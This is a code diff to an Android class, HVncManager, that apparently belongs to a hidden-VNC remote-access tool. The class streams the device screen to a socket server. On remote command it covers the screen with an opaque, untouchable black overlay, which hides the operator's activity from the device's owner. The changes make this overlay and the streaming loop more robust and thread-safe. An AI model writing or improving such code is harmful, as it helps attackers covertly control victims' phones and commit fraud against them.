@@ -93,7 +93,8 @@ public final class HVncManager {
     private final BlockingQueue<EncodedFrame> frameQueue = new LinkedBlockingQueue<>(MAX_DECODE_QUEUE);
     private volatile Thread senderThread = null;
     private volatile boolean senderRunning = false;
-    private final Object senderLock = new Object();
+    private final Object senderLock     = new Object();
+    private final Object blackScreenLock = new Object(); // guards blackScreenView + blackScreenActive
     private io.socket.emitter.Emitter.Listener disconnectListener = null;
     private HandlerThread cbThread = null;
     private volatile boolean restartInProgress = false;
@@ -295,54 +296,59 @@ public final class HVncManager {
 
     // v4.0: black screen — put a black overlay on device screen
     public void setBlackScreen(boolean on, String cmdId) {
-        try {
-            Context ctx = FasonApp.getContext();
-            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
-            if (wm == null) {
-                sendBlackScreenResult(false, "no window manager", cmdId);
-                return;
-            }
-            if (on && blackScreenView == null) {
-                blackScreenView = new View(ctx);
-                blackScreenView.setBackgroundColor(0xFF000000);
+        // All state mutations guarded by blackScreenLock. UI work posted to main thread
+        // from inside the lock so we capture a consistent snapshot of the view reference.
+        synchronized (blackScreenLock) {
+            try {
+                Context ctx = FasonApp.getContext();
+                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
+                if (wm == null) { sendBlackScreenResult(false, "no_wm", cmdId); return; }
+
                 int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                     ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                     : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
-                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    type,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-                    PixelFormat.OPAQUE
-                );
-                params.alpha = 1.0f;
-                new Handler(android.os.Looper.getMainLooper()).post(() -> {
-                    try {
-                        wm.addView(blackScreenView, params);
-                        blackScreenActive = true;
-                        sendBlackScreenResult(true, null, cmdId);
-                    } catch (Exception e) {
-                        blackScreenView = null;
-                        sendBlackScreenResult(false, e.getMessage(), cmdId);
-                    }
-                });
-            } else if (!on && blackScreenView != null) {
-                final View v = blackScreenView;
-                blackScreenView = null;
-                new Handler(android.os.Looper.getMainLooper()).post(() -> {
-                    try {
-                        wm.removeView(v);
-                    } catch (Exception ignored) {}
+
+                if (on && blackScreenView == null) {
+                    View v = new View(ctx);
+                    v.setBackgroundColor(0xFF000000);
+                    blackScreenView = v;
+                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        type,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                        PixelFormat.OPAQUE);
+                    params.alpha = 1.0f;
+                    new Handler(android.os.Looper.getMainLooper()).post(() -> {
+                        synchronized (blackScreenLock) {
+                            if (blackScreenView != v) return; // superseded
+                            try {
+                                wm.addView(v, params);
+                                blackScreenActive = true;
+                                sendBlackScreenResult(true, null, cmdId);
+                            } catch (Exception e) {
+                                blackScreenView  = null;
+                                blackScreenActive = false;
+                                sendBlackScreenResult(false, e.getMessage(), cmdId);
+                            }
+                        }
+                    });
+                } else if (!on && blackScreenView != null) {
+                    final View v = blackScreenView;
+                    blackScreenView  = null;
                     blackScreenActive = false;
-                    sendBlackScreenResult(false, null, cmdId);
-                });
-            } else {
-                sendBlackScreenResult(on, null, cmdId);
+                    new Handler(android.os.Looper.getMainLooper()).post(() -> {
+                        try { wm.removeView(v); } catch (Exception ignored) {}
+                        sendBlackScreenResult(false, null, cmdId);
+                    });
+                } else {
+                    sendBlackScreenResult(on, null, cmdId);
+                }
+            } catch (Exception e) {
+                sendBlackScreenResult(false, e.getMessage(), cmdId);
             }
-        } catch (Exception e) {
-            sendBlackScreenResult(false, e.getMessage(), cmdId);
         }
     }
 
@@ -486,9 +492,11 @@ public final class HVncManager {
     public void stop() {
         synchronized (lock) {
             if (restartInProgress) {
+                // Signal the in-progress restart to abort and tear down when it checks
                 stopRequested = true;
                 return;
             }
+            restartInProgress = false; // defensive clear — ensures no stuck state
             if (!streaming && mediaProjection == null && encoder == null
                 && encoderThread == null && cbThread == null && disconnectListener == null) {
                 return;
@@ -576,7 +584,21 @@ public final class HVncManager {
         }
         releaseStreamWakeLock();
         // v4.0: remove black screen if streaming stops
-        if (blackScreenActive) setBlackScreen(false, null);
+        // Clean up black screen overlay if it's up — must be sync-guarded
+        synchronized (blackScreenLock) {
+            if (blackScreenView != null) {
+                final View v = blackScreenView;
+                blackScreenView  = null;
+                blackScreenActive = false;
+                new Handler(android.os.Looper.getMainLooper()).post(() -> {
+                    try {
+                        Context c = FasonApp.getContext();
+                        WindowManager w = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
+                        if (w != null) w.removeView(v);
+                    } catch (Exception ignored) {}
+                });
+            }
+        }
         com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
         if (svc != null) svc.downgradeFromMediaProjection();
         if (wasStreaming && clearToken) sendStatus("stopped", null);
@@ -652,20 +674,30 @@ public final class HVncManager {
     }
 
     private int[] computeDimensions(Context ctx) {
-        android.view.WindowManager wm = (android.view.WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            android.view.WindowMetrics wmMetrics = wm.getCurrentWindowMetrics();
-            android.graphics.Rect bounds = wmMetrics.getBounds();
-            screenWidth = bounds.width();
-            screenHeight = bounds.height();
-        } else {
-            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
-            wm.getDefaultDisplay().getRealMetrics(metrics);
-            screenWidth = metrics.widthPixels;
-            screenHeight = metrics.heightPixels;
+        try {
+            android.view.WindowManager wm =
+                (android.view.WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                android.view.WindowMetrics wm2 = wm.getCurrentWindowMetrics();
+                android.graphics.Rect bounds = wm2.getBounds();
+                screenWidth  = bounds.width();
+                screenHeight = bounds.height();
+            } else {
+                android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
+                //noinspection deprecation
+                wm.getDefaultDisplay().getRealMetrics(metrics);
+                screenWidth  = metrics.widthPixels;
+                screenHeight = metrics.heightPixels;
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "computeDimensions display query failed: " + e.getMessage());
         }
-        int targetWidth = Math.max(2, ((int) (screenWidth * (this.scalePercent / 100.0))) & ~1);
-        int targetHeight = Math.max(2, ((int) (screenHeight * (this.scalePercent / 100.0))) & ~1);
+        // Hard fallback — avoids 0/NaN when display query fails before first frame
+        if (screenWidth  <= 0) screenWidth  = 1080;
+        if (screenHeight <= 0) screenHeight = 1920;
+        double scale = Math.max(10, Math.min(this.scalePercent, 100)) / 100.0;
+        int targetWidth  = Math.max(2, ((int)(screenWidth  * scale)) & ~1);
+        int targetHeight = Math.max(2, ((int)(screenHeight * scale)) & ~1);
         return new int[] { targetWidth, targetHeight };
     }
 
@@ -1050,7 +1082,13 @@ public final class HVncManager {
                         if (frame == null) continue;
                         if (!streaming) continue;
                         Socket socket = SocketClient.getInstance().getSocket();
-                        if (socket == null || !socket.connected()) continue;
+                        if (socket == null || !socket.connected()) {
+                            // Back off 500ms when disconnected — don't spin burning CPU
+                            // building a frame queue nobody is reading.
+                            frameQueue.clear();
+                            Thread.sleep(500);
+                            continue;
+                        }
                         // v4.0: adaptive bitrate check
                         int qSize = frameQueue.size();
                         if (qSize >= MAX_DECODE_QUEUE) {
@@ -1071,7 +1109,8 @@ public final class HVncManager {
                             JSONObject meta = new JSONObject();
                             meta.put(Protocol.KEY_TYPE, "frame");
                             meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
-                            meta.put("pts", frame.ptsUs);
+                            // Cap pts to avoid JavaScript precision loss (> 2^53)
+                            meta.put("pts", frame.ptsUs & 0x001F_FFFF_FFFF_FFFFL);
                             meta.put("keyframe", frame.keyframe);
                             meta.put(Protocol.KEY_WIDTH, encodedWidth);
                             meta.put(Protocol.KEY_HEIGHT, encodedHeight);
